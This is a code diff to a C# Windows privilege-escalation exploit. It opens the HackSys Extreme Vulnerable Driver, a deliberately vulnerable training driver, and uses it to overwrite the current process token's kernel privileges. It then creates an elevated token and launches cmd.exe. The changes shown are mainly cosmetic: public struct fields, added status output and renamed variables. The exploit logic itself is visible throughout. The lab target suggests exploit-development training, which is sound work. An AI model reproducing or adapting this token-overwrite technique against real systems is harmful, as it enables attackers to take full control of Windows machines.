@@ -475,10 +475,10 @@ namespace SecondaryLogonVariant
         [StructLayout(LayoutKind.Sequential)]
         struct SECURITY_QUALITY_OF_SERVICE
         {
-            readonly int Length;
-            readonly SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
-            readonly byte ContextTrackingMode;
-            readonly byte EffectiveOnly;
+            public int Length;
+            public SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
+            public byte ContextTrackingMode;
+            public byte EffectiveOnly;
 
             public SECURITY_QUALITY_OF_SERVICE(
                 SECURITY_IMPERSONATION_LEVEL _impersonationLevel,
@@ -1462,22 +1462,27 @@ namespace SecondaryLogonVariant
             if (!Environment.Is64BitOperatingSystem)
             {
                 Console.WriteLine("[!] 32 bit OS is not supported.\n");
-
                 return;
             }
             else if (IntPtr.Size != 8)
             {
                 Console.WriteLine("[!] Should be built with 64 bit pointer.\n");
-
                 return;
             }
 
-            IntPtr tokenPointer = GetCurrentProcessTokenPointer();
+            Console.WriteLine("[*] Current account is \"{0}\\{1}\"", Environment.UserDomainName, Environment.UserName);
+            Console.WriteLine("[>] Trying to find token address for this process.");
 
-            if (tokenPointer == IntPtr.Zero)
+            IntPtr pCurrentToken = GetCurrentProcessTokenPointer();
+
+            if (pCurrentToken == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                 return;
+            }
+            else
+            {
+                Console.WriteLine("[+] nt!_TOKEN for this process @ 0x{0}", pCurrentToken.ToString("X16"));
             }
 
             string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
@@ -1487,14 +1492,12 @@ namespace SecondaryLogonVariant
             if (hDevice == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to open {0}", deviceName);
-
                 return;
             }
 
-            var privs = (ulong)(SepTokenPrivilegesFlags.CREATE_TOKEN |
-                SepTokenPrivilegesFlags.IMPERSONATE);
+            var privs = (ulong)(SepTokenPrivilegesFlags.CREATE_TOKEN | SepTokenPrivilegesFlags.IMPERSONATE);
 
-            OverwriteTokenPrivileges(hDevice, tokenPointer, privs);
+            OverwriteTokenPrivileges(hDevice, pCurrentToken, privs);
             CloseHandle(hDevice);
 
             IntPtr hPrimaryToken = CreateElevatedToken(
@@ -1504,9 +1507,7 @@ namespace SecondaryLogonVariant
             if (hPrimaryToken == IntPtr.Zero)
                 return;
 
-            CreateSecondaryLogonProcess(
-                hPrimaryToken,
-                "C:\\Windows\\System32\\cmd.exe");
+            CreateSecondaryLogonProcess(hPrimaryToken, "C:\\Windows\\System32\\cmd.exe");
 
             CloseHandle(hPrimaryToken);
         }
